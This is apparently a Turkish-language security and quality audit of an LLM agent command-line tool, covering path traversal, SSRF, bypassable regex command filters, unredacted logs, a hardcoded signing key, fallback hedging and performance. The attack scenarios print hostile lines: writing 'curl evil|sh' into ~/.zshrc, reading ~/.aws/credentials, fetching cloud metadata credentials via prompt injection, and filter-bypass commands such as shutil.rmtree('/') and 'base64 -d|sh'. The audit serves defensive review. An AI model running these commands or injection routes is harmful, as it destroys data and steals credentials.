01 Güvenlik Açıkları

Tasarım düşünülmüş (merkezi tehlike listesi, sabit-zamanlı imza, bellek öncesi sır taraması). Ama dışa bakan araçlarda sınır kontrolü eksik.

Kritik Dosya araçlarında proje kökü dışına yazma/okuma koruması yok

tools/files.py:21-24 — resolve_path mutlak yolları olduğu gibi kabul eder; resolve() + kök-altında doğrulaması yok. ../../ traversal ve kök-içi symlink de engellenmez. safety.py:56 dosya yazmayı tehlike kontrolünden bilinçli muaf tutuyor.

Senaryo: LLM write_file(path="~/.zshrc", content="curl evil|sh") çağırır; auto modunda dosya yazma yıkıcı sayılmadığı için onay istenmez → sonraki kabuk oturumunda kalıcı RCE. read_file ile ~/.aws/credentials, .env okunabilir.

Yüksek Web aracında SSRF koruması yok

tools/web.py:37-49 — URL doğrulanmıyor, follow_redirects=True. 127.0.0.1, 169.254.169.254 (bulut metadata), [::1] engellenmiyor; dış URL 302 ile localhost’a yönlendirebilir. web_fetch değiştirici olmadığı için onaya da girmez.

Senaryo: Prompt injection ile web_fetch("http://169.254.169.254/latest/meta-data/iam/...") → bulutta IAM kimlik bilgileri model bağlamına sızar.

Yüksek Tehlikeli komut tespiti regex tabanlı — baypas edilebilir

tools/shell.py:28 subprocess.run(shell=True) + safety.py regex listesi. Yakalanmayanlar: python -c "import shutil;shutil.rmtree('/')", find . -delete, rm -r -f (ayrık), > dosya, echo…|base64 -d|sh, bash <(curl…). shell=True ile ;/&&/$() zincirlemesi serbest.

Senaryo: Manipüle çıktı os.system’lı bir python -c üretir; desende yok → danger_reason=None → auto modda sorulmadan çalışır.

Yüksek Redaction log / trace / JSONL çıktısına uygulanmıyor

core/redaction.py yalnızca ders belleği (learning.py:132) ve knowledge (validation.py:43) yollarında çağrılıyor. observability/json_sink.py:28 her olayın tüm alanlarını (ToolExecuted.args/output) redaksiyonsuz yazar. litellm_provider.py:105 ham istisna metni (URL/header içerebilir) kullanıcıya/loglara akar.

Yüksek Knowledge imzası: koda gömülü simetrik anahtar

knowledge/signing.py:17 — DEFAULT_INTEGRITY_KEY kaynakta açık ve HMAC simetrik; doğrulama = imzalama anahtarı. Herkes geçerli imza üretebilir. Kripto uygulaması sağlam (compare_digest), sorun güven modeli. Ed25519 gibi asimetrik imzaya taşınmalı.

Senaryo: Ortak knowledge deposuna yazabilen biri kötü niyetli “ders”i gömülü anahtarla imzalar; sync’te geçerli sayılır, belleğe girer, sonraki turları etkiler (dolaylı injection kalıcılığı).

Sistemde veri/talimat ayrımı yok; en yumuşak halka regex tehlike listesi. Playbook otomasyonu da (loop.py:458 _all_commands_safe) aynı zayıf sezgisele dayanıyor. git aracında boş subcommand → IndexError (shell.py:48).

02 Fallback & Yarım Bırakılan Noktalar

Zincir yarım değil, tam — ama beklenenden farklı çalışıyor. Kaynakta stub yok; ertelenen işler disiplinli biçimde docs/BACKLOG.md’de.

Nüans “Tier bitince düşme” değil — paralel yarıştırma (hedging)

providers/hedged.py:43-57 — birincil + tüm fallback modelleri asyncio.create_task ile aynı anda başlar, ilk ok=True kazanır, kalanlar iptal. Yani sıralı bir failover yok; hepsi baştan yarışır (gecikme = min, toplam değil). Docstring bunu dürüstçe belgeliyor.

Sonuç: Her istek 2-3 modele aynı anda gider → ücretsiz tier rate-limit’i daha hızlı tüketilebilir. Kullanıcıya “tier tükenince sonrakine geçer” diye anlatmak teknik olarak yanlış; “aynı anda yarıştırır, ilk başarılıyı alır” doğru ifade.

Sağlam İki katmanlı 429 dayanıklılığı

Model içi: litellm num_retries (defaults.yaml:32) 429/5xx’i yeniden dener, exception değil ok=False döner. Modeller arası: bir model 429 alırsa hedging paralel çalışan diğerinin başarısını kullanır. Hiçbiri başaramazsa birleşik ok=False sonuç (_all_failed).

Sağlam Fusion + agent iyileştirme döngüleri tam

Fusion (engines/fusion/engine.py): paralel adaylar → hakem ‖ sentez (paralel) → hakem düşerse sezgisel kazanan. Tek aday varsa hakem hiç çağrılmaz. Agent (engines/agent/loop.py): reflexion (araç hatasında yön) + otomatik devam (1 kez) + öz-eleştiri (denetçi model, tek düzeltici tur, sonsuz döngü yok).

Bilinçli olarak ertelenmiş / izlenen (BACKLOG.md)

  • nemotron-3-super token çorbası: yüksek bağlamda bozuk çıktı; öz-denetim kurtarıyor ama ham çöp düzeltmeden önce ekranda görünüyor (agent modu canlı akıtır, öz-denetim tur sonrası çalışır — çözülmemiş mimari gerilim).
  • Hakem eksik puanlama: üç adaydan bazen ikisine puan verir (tur bozulmaz, tablo eksik görünür) — kabul edilmiş.
  • web_search HTML kazımaya dayanıyor; uç değişirse regex güncellenir.
  • Fusion modunda streaming kapalı; ❯ işareti terminal resize’da çoğalabiliyor (prompt_toolkit kök nedeni, temiz çözüm hazır ama uygulanmamış).
  • Karar bekleyen: lock dosyası üretilsin mi, kök-dışı yazma kısıtlansın mı, config show tablo görünümü.

Kaynak ağacında tek bir TODO/FIXME/NotImplementedError/pass-only gövde yok — kural (“kod içine TODO yazılmaz, backlog’a düşer”) gerçekten uygulanmış.

04 Performans Önerileri

Eşzamanlılık çekirdeği gerçekten iyi. İki somut kazanç var.

Yüksek kazanç litellm eager import → soğuk açılış ~1.6s yavaş

litellm_provider.py:18 modül tepesinde import litellm (ölçülen ~1.66s). chromadb doğru şekilde tembel yüklenirken (store.py:44) litellm’e aynı disiplin uygulanmamış. Tembelleştirmek --help/--version/setup gibi LLM’e dokunmayan yolları ~1.6s hızlandırır.

Orta Async döngüde bloklayan senkron araç çağrıları

shell.subprocess.run, senkron httpx.Client (web.py:40), ChromaDB query() (code_index.py:50, lessons.py:67), dosya I/O — hiçbiri asyncio.to_thread ile sarılmamış. Arka planda dönen ders çıkarımı + model warm-up’ı stall edebilir. registry.execute’ta senkron executor’ları to_thread ile sarmak çözer (proje input.py:124’te bu deseni zaten kullanıyor).

Düşük Lock dosyası yok

pyproject.toml bağımlılıkları alt+üst sınırlı (iyi) ama uv.lock/requirements.txt yok — tam tekrarlanabilir kurulum garantisi yok. Uygulama (kütüphane değil) olduğu için gerçek boşluk; uv lock önerilir.

Gerçekten iyi yapılmış performans

  • Hedging paralel + iptal: ilk başarılı kazanır, kaybedenler _cancel_all/_close_all ile temizlenir; gecikme = min, toplam değil.
  • Straggler kesme (concurrency.py gather_with_cutoff): grace + hard-cap + iptal, generic ve ağsız test edilebilir.
  • Artımlı reindex: yalnızca değişen parçalar gömülür, batch’li, N+1 yok. ChromaDB istemci önbelleği dizin başına tek+kilitli.
  • Hibrit retrieval (BM25 + RRF) reranker modeli olmadan ucuz; NIM soğuk başlangıcı warm-up ile gizli.
